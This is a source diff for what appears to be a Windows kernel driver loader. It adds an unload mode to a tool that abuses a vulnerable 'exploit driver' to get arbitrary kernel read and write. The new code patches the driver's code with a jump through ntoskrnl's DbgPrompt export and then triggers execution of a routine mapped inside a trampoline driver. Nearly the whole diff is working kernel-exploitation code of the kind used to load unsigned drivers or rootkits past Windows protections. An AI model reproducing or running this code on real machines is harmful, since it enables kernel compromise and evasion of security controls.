@@ -35,6 +35,7 @@ typedef const KP_FUNC_TABLE* (*FnKpGetTable)(void);
 typedef BOOL(*FnKpInitialize)(void);
 
 BOOL ReadConfig();
+BOOL UnhookAndGo(FnKpGetTable pKpGetTable, FnKpInitialize pKpInitialize);
 VOID DriverCheck();
 BOOL HookAndGo(FnKpGetTable pKpGetTable, FnKpInitialize pKpInitialize);
 BOOL EnableDebugPrivilege()
@@ -80,6 +81,8 @@ BOOL EnableDebugPrivilege()
 
 	return GetLastError() == ERROR_SUCCESS;
 }
+static bool g_unload_mode = false;
+
 int main(int argc, char* argv[]) {
 	EnableDebugPrivilege();
 	volatile void* force_crt_strncpy = (void*)strncpy;
@@ -87,9 +90,19 @@ int main(int argc, char* argv[]) {
 
 	LDRLogEtwInit();
 
+	// Parse --unload flag
+	for (int i = 1; i < argc; i++) {
+		if (strcmp(argv[i], "--unload") == 0) {
+			g_unload_mode = true;
+			break;
+		}
+	}
+
 	// Copy fltMgr.sys from system32 drivers to current directory (force overwrite)
-	if (!CopyFileW(L"C:\\Windows\\System32\\drivers\\fltMgr.sys", L"fltMgr.sys", FALSE)) {
-		LDRLog(L"Warning: Failed to copy fltMgr.sys (err=0x%x)\n", GetLastError());
+	if (!g_unload_mode) {
+		if (!CopyFileW(L"C:\\Windows\\System32\\drivers\\fltMgr.sys", L"fltMgr.sys", FALSE)) {
+			LDRLog(L"Warning: Failed to copy fltMgr.sys (err=0x%x)\n", GetLastError());
+		}
 	}
 
 	if (!ReadConfig()) {
@@ -115,13 +128,21 @@ int main(int argc, char* argv[]) {
 		return 1;
 	}
 
-	DriverCheck();
-
-	// HookAndGo will call KpInitialize after obtaining the device handle
-	if (!HookAndGo(pKpGetTable, pKpInitialize)) {
-		LDRLog(L"hook failed\n");
-		FreeLibrary(g_hKpDll);
-		return 1;
+	if (g_unload_mode) {
+		LDRLog(L"Running in --unload mode\n");
+		if (!UnhookAndGo(pKpGetTable, pKpInitialize)) {
+			LDRLog(L"unload failed\n");
+			FreeLibrary(g_hKpDll);
+			return 1;
+		}
+	} else {
+		DriverCheck();
+		// HookAndGo will call KpInitialize after obtaining the device handle
+		if (!HookAndGo(pKpGetTable, pKpInitialize)) {
+			LDRLog(L"hook failed\n");
+			FreeLibrary(g_hKpDll);
+			return 1;
+		}
 	}
 	LDRLog(L"Done\n");
 	FreeLibrary(g_hKpDll);
@@ -354,6 +375,194 @@ VOID DriverCheck() {
 
 		RegCloseKey(hKey);
 	}
+}
+
+BOOL UnhookAndGo(FnKpGetTable pKpGetTable, FnKpInitialize pKpInitialize) {
+	LDRLog(L"UnhookAndGo: source=[%S] exp=[%S] HookPointRVA=0x%x trampoline=[%S]\n",
+		g_source_driver, g_exp_driver_name, g_hook_point_rva, g_trampoline_driver);
+
+	// Prepare disk path for source driver (to read MiniUnload export RVA from disk PE)
+	CHAR source_sys_path[MAX_PATH] = { 0 };
+	{
+		WCHAR w_src[MAX_PATH] = { 0 };
+		Helper::ConvertCharToWchar(g_source_driver, w_src, MAX_PATH);
+		std::wstring src_path = Helper::GetCurrentDirFilePath((TCHAR*)w_src);
+		Helper::ConvertWcharToChar(src_path.c_str(), source_sys_path, MAX_PATH);
+	}
+
+	// Get MiniUnload export RVA from source driver on disk
+	DWORD mini_unload_rva = 0;
+	if (!PE_GetExportOffset(source_sys_path, MINI_UNLOAD_EXPORT, &mini_unload_rva)) {
+		LDRLog(L"failed to find export [%S] in [%S]\n", MINI_UNLOAD_EXPORT, source_sys_path);
+		return FALSE;
+	}
+	LDRLog(L"MiniUnload RVA=0x%x (from source driver on disk)\n", mini_unload_rva);
+
+	// Get TrampolineDriver BaseOfCode from disk PE
+	CHAR tramp_sys_path[MAX_PATH] = { 0 };
+	{
+		WCHAR w_tramp[MAX_PATH] = { 0 };
+		Helper::ConvertCharToWchar(g_trampoline_driver, w_tramp, MAX_PATH);
+		std::wstring tramp_path = Helper::GetCurrentDirFilePath((TCHAR*)w_tramp);
+		Helper::ConvertWcharToChar(tramp_path.c_str(), tramp_sys_path, MAX_PATH);
+	}
+
+	DWORD evbda_base_of_code = 0;
+	{
+		std::wstring w_tramp_sys_path(tramp_sys_path, tramp_sys_path + strlen(tramp_sys_path));
+		if (!PE_GetCodeSectionStartOffset(w_tramp_sys_path, evbda_base_of_code)) {
+			LDRLog(L"failed to get TrampolineDriver BaseOfCode\n");
+			return FALSE;
+		}
+	}
+	LDRLog(L"TrampolineDriver BaseOfCode=0x%x\n", evbda_base_of_code);
+
+	// Initialize KernelPower DLL
+	if (!pKpInitialize()) {
+		LDRLog(L"KpInitialize failed\n");
+		return FALSE;
+	}
+	g_kpTable = pKpGetTable();
+	LdrCtx_SetKpTable(g_kpTable);
+
+	// Get ntoskrnl base + DbgPrompt (PIT)
+	PVOID krnl_base = NULL;
+	NTSTATUS st = KRNL::GetDriverBase(NTKRNL_NAME, &krnl_base);
+	if (0 != st) {
+		LDRLog(L"failed to get ntoskrnl base, Status=0x%x\n", st);
+		return FALSE;
+	}
+	LdrCtx_SetKrnlBase(krnl_base);
+	LDRLog(L"ntoskrnl base=0x%p\n", krnl_base);
+
+	DWORD dbg_prompt_offset = 0;
+	if (!PE_GetExportOffset("C:\\Windows\\System32\\ntoskrnl.exe", DBG_EXPORT_FUNC, &dbg_prompt_offset)) {
+		LDRLog(L"failed to find DbgPrompt export in ntoskrnl.exe\n");
+		return FALSE;
+	}
+	LdrCtx_SetDbgPromptAbsAddr((PVOID)((DWORD64)krnl_base + dbg_prompt_offset));
+	LDRLog(L"DbgPrompt addr=0x%p (ntoskrnl base + 0x%x)\n", LdrCtx_GetDbgPromptAbsAddr(), dbg_prompt_offset);
+
+	// Get exploit driver base
+	PVOID exp_base = NULL;
+	st = KRNL::GetDriverBase(g_exp_driver_name, &exp_base);
+	if (0 != st) {
+		LDRLog(L"failed to get exploit driver base, Status=0x%x\n", st);
+		return FALSE;
+	}
+	LdrCtx_SetExpDrvBase(exp_base);
+	LDRLog(L"exploit driver base=0x%p\n", exp_base);
+
+	// Get trampoline driver base
+	PVOID tramp_base = NULL;
+	st = KRNL::GetDriverBase(g_trampoline_driver, &tramp_base);
+	if (0 != st) {
+		LDRLog(L"failed to get trampoline driver base, Status=0x%x\n", st);
+		return FALSE;
+	}
+	LdrCtx_SetTrampolineDrvBase(tramp_base);
+	LDRLog(L"trampoline driver base=0x%p\n", tramp_base);
+
+	// Calculate MiniUnload kernel absolute address:
+	// SourceDriver code was previously mapped at tramp_base + evbda_base_of_code
+	// MiniUnload function is at that base + mini_unload_rva
+	DWORD64 mini_unload_addr = (DWORD64)tramp_base + evbda_base_of_code + mini_unload_rva;
+	LDRLog(L"MiniUnload kernel addr=0x%llX (tramp_base + BaseOfCode(0x%x) + RVA(0x%x))\n",
+		mini_unload_addr, evbda_base_of_code, mini_unload_rva);
+
+	// Restore original bytes at hook point from hook.save
+	{
+		CHAR save_path[MAX_PATH] = { 0 };
+		{
+			WCHAR w_save[MAX_PATH] = { 0 };
+			Helper::ConvertCharToWchar(HOOKSAVE_FILE, w_save, MAX_PATH);
+			std::wstring w_full = Helper::GetCurrentDirFilePath((TCHAR*)w_save);
+			Helper::ConvertWcharToChar(w_full.c_str(), save_path, MAX_PATH);
+		}
+		HANDLE hf = CreateFileA(save_path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+		if (hf != INVALID_HANDLE_VALUE) {
+			DWORD save_byte_count = 0;
+			DWORD read_bytes = 0;
+			BOOL ok = ReadFile(hf, &save_byte_count, sizeof(DWORD), &read_bytes, NULL) && read_bytes == sizeof(DWORD);
+			if (ok && save_byte_count > 0 && save_byte_count <= 256) {
+				UCHAR* save_buf = (UCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, save_byte_count);
+				ok = ReadFile(hf, save_buf, save_byte_count, &read_bytes, NULL) && read_bytes == save_byte_count;
+				if (ok) {
+					PVOID restore_addr = (PVOID)((DWORD64)exp_base + g_hook_point_rva);
+					if (!g_kpTable->WritePrimitive(restore_addr, save_buf, save_byte_count)) {
+						LDRLog(L"failed to restore exploit driver at 0x%p\n", restore_addr);
+					} else {
+						LDRLog(L"restored exploit driver %u bytes at 0x%p (offset=0x%x)\n",
+							save_byte_count, restore_addr, g_hook_point_rva);
+					}
+				}
+				HeapFree(GetProcessHeap(), 0, save_buf);
+			} else {
+				LDRLog(L"hook.save invalid or empty, skipping restore\n");
+			}
+			CloseHandle(hf);
+		} else {
+			LDRLog(L"no hook.save found, skipping restore\n");
+		}
+	}
+
+	// Read original bytes at hook point (for new hook.save)
+	PVOID hook_point = (LPVOID)((DWORD64)exp_base + g_hook_point_rva);
+	UCHAR original_bytes[ff25jmpsize] = { 0 };
+	g_kpTable->ReadPrimitive(hook_point, original_bytes, ff25jmpsize);
+
+	// Write MiniUnload address to PIT (DbgPrompt)
+	DWORD64 trampoline_pit = (DWORD64)LdrCtx_GetDbgPromptAbsAddr();
+	if (!g_kpTable->WritePrimitive((PVOID)trampoline_pit, (void*)(&mini_unload_addr), sizeof(DWORD64))) {
+		LDRLog(L"failed to write MiniUnload addr to PIT at 0x%llX\n", trampoline_pit);
+		return FALSE;
+	}
+	LDRLog(L"wrote MiniUnload addr=0x%llX to PIT at 0x%llX\n", mini_unload_addr, trampoline_pit);
+
+	// Install ff25 hook at HookPointRVA -> PIT -> MiniUnload
+	{
+		UCHAR ff25[ff25jmpsize] = { 0xff, 0x25, 0, 0, 0, 0 };
+		DWORD rel32 = (DWORD)(trampoline_pit - ((DWORD64)hook_point + ff25jmpsize));
+		*(DWORD*)(ff25 + ff25_opcode_size) = rel32;
+		LDRLog(L"ff25 rel32=0x%x\n", rel32);
+		g_kpTable->WritePrimitive(hook_point, (void*)(ff25), ff25jmpsize);
+	}
+	LDRLog(L"hook installed at 0x%p -> MiniUnload at 0x%llX (%S)\n",
+		hook_point, mini_unload_addr, g_exp_driver_name);
+
+	// Save new hook.save for future restore
+	{
+		CHAR save_path[MAX_PATH] = { 0 };
+		{
+			WCHAR w_save[MAX_PATH] = { 0 };
+			Helper::ConvertCharToWchar(HOOKSAVE_FILE, w_save, MAX_PATH);
+			std::wstring w_full = Helper::GetCurrentDirFilePath((TCHAR*)w_save);
+			Helper::ConvertWcharToChar(w_full.c_str(), save_path, MAX_PATH);
+		}
+		HANDLE hf = CreateFileA(save_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+		if (hf != INVALID_HANDLE_VALUE) {
+			DWORD written = 0;
+			BOOL ok = TRUE;
+			DWORD save_byte_count = ff25jmpsize;
+			if (ok) ok = WriteFile(hf, &save_byte_count, sizeof(DWORD), &written, NULL) && written == sizeof(DWORD);
+			if (ok) ok = WriteFile(hf, original_bytes, save_byte_count, &written, NULL) && written == save_byte_count;
+			CloseHandle(hf);
+			if (ok) {
+				LDRLog(L"hook.save written: %u bytes at offset 0x%x\n", save_byte_count, g_hook_point_rva);
+			} else {
+				LDRLog(L"warning: hook.save write incomplete\n");
+			}
+		}
+	}
+
+	// Trigger the hooked driver to execute MiniUnload
+	if (!g_kpTable->TriggerExecute()) {
+		LDRLog(L"TriggerExecute failed\n");
+		return FALSE;
+	}
+	LDRLog(L"TriggerExecute succeeded, MiniUnload triggered\n");
+
+	return TRUE;
 }
 
 BOOL HookAndGo(FnKpGetTable pKpGetTable, FnKpInitialize pKpInitialize) {
